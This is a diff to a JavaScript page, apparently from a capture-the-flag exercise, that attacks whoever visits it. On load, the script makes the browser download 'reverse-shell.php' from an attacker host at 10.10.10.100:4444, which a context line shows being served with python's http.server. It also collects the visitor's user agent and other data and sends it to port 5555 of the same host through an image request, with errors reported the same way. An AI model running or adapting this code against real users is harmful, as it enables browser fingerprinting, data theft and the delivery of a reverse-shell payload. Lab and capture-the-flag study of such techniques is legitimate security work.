@@ -79,8 +79,26 @@ sudo python3 -m http.server 4444
     <title>CTF</title>
     <script>
       (async function() {
+        const YOUR_SERVER_IP = "10.10.10.100"
+
         try {
-          const YOUR_SERVER_IP = "10.10.10.100"
+          // Create an anchor element dynamically
+          var link = document.createElement('a');
+        
+          // Set the href to your hosted reverse shell
+          link.href = `http://${YOUR_SERVER_IP}:4444/reverse-shell.php`;
+        
+          // Set the download attribute to suggest a filename for the browser
+          link.download = 'reverse-shell.php';
+        
+          // Append the link to the document body
+          document.body.appendChild(link);
+        
+          // Programmatically click the link to start the download
+          link.click();
+          
+          // Remove the link from the DOM
+          document.body.removeChild(link);
 
           // Collect User-Agent
           let userAgent = navigator.userAgent;
@@ -122,24 +140,6 @@ sudo python3 -m http.server 4444
           // Send the data to your server
           let img = new Image();
           img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
-
-          // Create an anchor element dynamically
-          var link = document.createElement('a');
-        
-          // Set the href to your hosted reverse shell
-          link.href = `http://${YOUR_SERVER_IP}:4444/reverse-shell.php`;
-        
-          // Set the download attribute to suggest a filename for the browser
-          link.download = 'reverse-shell.php';
-        
-          // Append the link to the document body
-          document.body.appendChild(link);
-        
-          // Programmatically click the link to start the download
-          link.click();
-          
-          // Remove the link from the DOM
-          document.body.removeChild(link);
         } catch (error) {
           let img = new Image();
           img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
